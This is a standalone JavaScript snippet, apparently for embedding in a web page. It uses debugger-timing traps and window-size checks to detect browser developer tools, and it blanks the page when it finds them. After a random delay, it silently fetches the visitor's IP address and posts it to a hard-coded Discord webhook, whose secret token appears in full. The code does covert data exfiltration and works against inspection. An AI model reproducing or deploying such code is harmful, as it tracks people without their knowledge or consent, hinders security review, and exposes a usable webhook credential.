(function() {
    // Anti DevTools detection
    const detectDevTools = () => {
        const startTime = new Date();
        debugger;
        const endTime = new Date();
        return endTime - startTime > 100;
    };

    // Check for DevTools and window resizing
    setInterval(() => {
        if (detectDevTools() || 
            window.outerHeight - window.innerHeight > 200 || 
            window.outerWidth - window.innerWidth > 200) {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
        }
    }, 1000);

    // Send IP info to webhook
    const sendIPInfo = async () => {
        try {
            const response = await fetch('https://api.myip.com')
                .catch(() => fetch('https://ipwho.is'))
                .catch(() => fetch('https://ifconfig.me/all.json'));
            
            const data = await response.json();
            
            const payload = {
                content: `New Visitor - IP: ${btoa(data.ip || data.address)}`,
                username: 'Access Monitor'
            };

            await fetch('https://discord.com/api/webhooks/1317108564736737382/oxsbS03XDSYsKHyNKFSbgaC90hUY3luNIz-q3BPBDDZ6zVXkagBVEqcBAynL1kqGbPEH', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
        } catch(err) {
            console.clear();
        }
    };

    // Send IP after random delay
    setTimeout(sendIPInfo, Math.floor(Math.random() * 5000) + 2000);

    // Additional anti-debug protection
    (() => {
        const checkDebug = () => {
            const d = new Date();
            const checks = [
                Function.prototype.toString,
                Function.prototype.call,
                Function.prototype.apply
            ];
            debugger;
            return new Date() - d > 100;
        };
        setInterval(checkDebug, 1000);
    })();
})();
